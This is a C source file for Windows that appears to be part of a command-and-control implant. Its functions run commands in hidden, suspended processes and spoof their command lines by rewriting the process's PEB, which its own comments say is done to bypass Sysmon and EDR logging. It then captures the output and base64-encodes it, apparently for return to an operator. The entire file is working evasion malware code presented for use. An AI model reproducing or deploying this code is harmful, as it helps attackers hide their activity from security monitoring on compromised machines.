#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winternl.h>
#include <stddef.h>
#include <stdlib.h>

#include "dynamic_linking.h"

#define OUTPUT_BUFFER_SIZE 65536

BOOL executeCommandWithEvasion(const char *command);
char* executeCommandWithOutput(const char *command);

// Replace everything after the first space with spaces to spoof the command line
void replaceArgumentsWithSpaces(const char *original, char *modified) {
    const char *firstSpace = strchr(original, ' ');
    if (firstSpace != NULL) {
        size_t length = firstSpace - original + 1;
        strncpy(modified, original, length);
        memset(modified + length, ' ', strlen(original) - length);
        modified[strlen(original)] = '\0';
    } else {
        strcpy(modified, original);
    }
}

// Execute a command with cmdline evasion to bypass sysmon/EDR logging
// Returns TRUE on success, FALSE on failure
BOOL executeCommandWithEvasion(const char *command) {
    BOOL status = FALSE;
    wchar_t *realCmdlineW = NULL;
    wchar_t *spoofedCmdlineW = NULL;
    STARTUPINFOEX si;
    PROCESS_INFORMATION pi = {0};
    
    // Properly initialize STARTUPINFOEX
    memset(&si, 0, sizeof(STARTUPINFOEX));
    si.StartupInfo.cb = sizeof(STARTUPINFO);

    if (!command || strlen(command) == 0) {
        return FALSE;
    }

    // Configure STARTUPINFO to hide window
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;
    si.StartupInfo.lpReserved = NULL;
    si.lpAttributeList = NULL;

    // Create spoofed cmdline (everything after first space becomes spaces)
    char spoofedCmdline[MAX_PATH];
    replaceArgumentsWithSpaces(command, spoofedCmdline);

    // Convert real command to wide character string
    int realCmdlineLen = MultiByteToWideChar(CP_UTF8, 0, command, -1, NULL, 0);
    realCmdlineW = (wchar_t *)malloc(realCmdlineLen * sizeof(wchar_t));
    if (!realCmdlineW) {
        goto cleanup;
    }
    MultiByteToWideChar(CP_UTF8, 0, command, -1, realCmdlineW, realCmdlineLen);

    // Convert spoofed cmdline to wide character string
    int spoofedCmdlineLen = MultiByteToWideChar(CP_UTF8, 0, spoofedCmdline, -1, NULL, 0);
    spoofedCmdlineW = (wchar_t *)malloc(spoofedCmdlineLen * sizeof(wchar_t));
    if (!spoofedCmdlineW) {
        goto cleanup;
    }
    MultiByteToWideChar(CP_UTF8, 0, spoofedCmdline, -1, spoofedCmdlineW, spoofedCmdlineLen);

    // Create process in suspended state with spoofed cmdline and hidden window
    if (!DynCreateProcessA(NULL, spoofedCmdline, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si.StartupInfo, &pi)) {
        goto cleanup;
    }

    // Query process basic information to get PEB address
    PROCESS_BASIC_INFORMATION pbi;
    ULONG ret;
    if (DynNtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ret) != 0) {
        goto cleanup;
    }

    // Read the PEB structure from remote process
    PEB peb;
    if (!DynReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
        goto cleanup;
    }

    // Read the RTL_USER_PROCESS_PARAMETERS structure
    RTL_USER_PROCESS_PARAMETERS procParams;
    if (!DynReadProcessMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), NULL)) {
        goto cleanup;
    }

    // Overwrite the command line with the real command
    if (!DynWriteProcessMemory(pi.hProcess, procParams.CommandLine.Buffer, realCmdlineW, realCmdlineLen * sizeof(wchar_t), NULL)) {
        goto cleanup;
    }

    // Calculate the address of the Length field in the UNICODE_STRING structure
    PBYTE lengthAddress = (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine) + offsetof(UNICODE_STRING, Length);
    
    // Update the length to match the spoofed command (e.g., "cmd.exe" only)
    USHORT newLength = (wcslen(spoofedCmdlineW) - 1) * sizeof(wchar_t);  // Exclude null terminator
    
    // Write the new length to hide the real arguments
    if (!DynWriteProcessMemory(pi.hProcess, lengthAddress, &newLength, sizeof(USHORT), NULL)) {
        goto cleanup;
    }

    // Resume the main thread to execute the process
    if (DynResumeThread(pi.hThread) == (DWORD)-1) {
        goto cleanup;
    }

    status = TRUE;

cleanup:
    if (realCmdlineW) free(realCmdlineW);
    if (spoofedCmdlineW) free(spoofedCmdlineW);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    
    return status;
}

// Execute a command with cmdline evasion and capture output
// Returns dynamically allocated string with output (caller must free), or NULL on failure
char* executeCommandWithOutput(const char *command) {
    wchar_t *realCmdlineW = NULL;
    wchar_t *spoofedCmdlineW = NULL;
    STARTUPINFOEX si;
    PROCESS_INFORMATION pi = {0};
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    SECURITY_ATTRIBUTES sa = {0};
    char *output = NULL;
    char *buffer = NULL;
    DWORD totalBytesRead = 0;
    DWORD bytesRead = 0;
    
    // Properly initialize STARTUPINFOEX
    memset(&si, 0, sizeof(STARTUPINFOEX));
    si.StartupInfo.cb = sizeof(STARTUPINFO);

    if (!command || strlen(command) == 0) {
        return NULL;
    }

    // Allocate output buffer
    buffer = (char*)malloc(OUTPUT_BUFFER_SIZE);
    if (!buffer) {
        return NULL;
    }
    memset(buffer, 0, OUTPUT_BUFFER_SIZE);

    // Set up security attributes for pipe inheritance
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // Create pipe for stdout/stderr
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        goto cleanup;
    }

    // Ensure read handle is not inherited
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    // Configure STARTUPINFO to hide window and redirect output
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.StartupInfo.wShowWindow = SW_HIDE;
    si.StartupInfo.hStdOutput = hWritePipe;
    si.StartupInfo.hStdError = hWritePipe;
    si.StartupInfo.hStdInput = DynGetStdHandle(STD_INPUT_HANDLE);

    // Create spoofed cmdline (everything after first space becomes spaces)
    char spoofedCmdline[MAX_PATH];
    replaceArgumentsWithSpaces(command, spoofedCmdline);

    // Convert real command to wide character string
    int realCmdlineLen = MultiByteToWideChar(CP_UTF8, 0, command, -1, NULL, 0);
    realCmdlineW = (wchar_t *)malloc(realCmdlineLen * sizeof(wchar_t));
    if (!realCmdlineW) {
        goto cleanup;
    }
    MultiByteToWideChar(CP_UTF8, 0, command, -1, realCmdlineW, realCmdlineLen);

    // Convert spoofed cmdline to wide character string
    int spoofedCmdlineLen = MultiByteToWideChar(CP_UTF8, 0, spoofedCmdline, -1, NULL, 0);
    spoofedCmdlineW = (wchar_t *)malloc(spoofedCmdlineLen * sizeof(wchar_t));
    if (!spoofedCmdlineW) {
        goto cleanup;
    }
    MultiByteToWideChar(CP_UTF8, 0, spoofedCmdline, -1, spoofedCmdlineW, spoofedCmdlineLen);

    // Create process in suspended state with spoofed cmdline and hidden window
    if (!DynCreateProcessA(NULL, spoofedCmdline, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si.StartupInfo, &pi)) {
        goto cleanup;
    }

    // Query process basic information to get PEB address
    PROCESS_BASIC_INFORMATION pbi;
    ULONG ret;
    if (DynNtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ret) != 0) {
        goto cleanup;
    }

    // Read the PEB structure from remote process
    PEB peb;
    if (!DynReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
        goto cleanup;
    }

    // Read the RTL_USER_PROCESS_PARAMETERS structure
    RTL_USER_PROCESS_PARAMETERS procParams;
    if (!DynReadProcessMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), NULL)) {
        goto cleanup;
    }

    // Overwrite the command line with the real command
    if (!DynWriteProcessMemory(pi.hProcess, procParams.CommandLine.Buffer, realCmdlineW, realCmdlineLen * sizeof(wchar_t), NULL)) {
        goto cleanup;
    }

    // Calculate the address of the Length field in the UNICODE_STRING structure
    PBYTE lengthAddress = (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine) + offsetof(UNICODE_STRING, Length);
    
    // Update the length to match the spoofed command (e.g., "cmd.exe" only)
    USHORT newLength = (wcslen(spoofedCmdlineW) - 1) * sizeof(wchar_t);  // Exclude null terminator
    
    // Write the new length to hide the real arguments
    if (!DynWriteProcessMemory(pi.hProcess, lengthAddress, &newLength, sizeof(USHORT), NULL)) {
        goto cleanup;
    }

    // Resume the main thread to execute the process
    if (DynResumeThread(pi.hThread) == (DWORD)-1) {
        goto cleanup;
    }

    // Close write end of pipe so ReadFile will return when process exits
    DynCloseHandle(hWritePipe);
    hWritePipe = NULL;

    // Read output from pipe
    char tempBuffer[4096];
    while (DynReadFile(hReadPipe, tempBuffer, sizeof(tempBuffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        if (totalBytesRead + bytesRead < OUTPUT_BUFFER_SIZE - 1) {
            memcpy(buffer + totalBytesRead, tempBuffer, bytesRead);
            totalBytesRead += bytesRead;
        } else {
            // Buffer full, stop reading
            break;
        }
    }

    // Wait for process to complete
    WaitForSingleObject(pi.hProcess, 30000); // 30 second timeout

    // Null terminate the output
    buffer[totalBytesRead] = '\0';

    // Base64 encode the output
    if (totalBytesRead > 0) {
        output = base64_encode((unsigned char*)buffer, totalBytesRead);
        if (!output) {
            output = strdup("encoding failed");
        }
    } else {
        // Even "no output" should be base64 encoded for consistency
        const char* msg = "executed (no output)";
        output = base64_encode((unsigned char*)msg, strlen(msg));
        if (!output) {
            output = strdup("ZXhlY3V0ZWQgKG5vIG91dHB1dCk="); // base64 for "executed (no output)"
        }
    }

cleanup:
    if (buffer) free(buffer);
    if (realCmdlineW) free(realCmdlineW);
    if (spoofedCmdlineW) free(spoofedCmdlineW);
    if (hReadPipe) DynCloseHandle(hReadPipe);
    if (hWritePipe) DynCloseHandle(hWritePipe);
    if (pi.hProcess) DynCloseHandle(pi.hProcess);
    if (pi.hThread) DynCloseHandle(pi.hThread);
    
    return output;
}
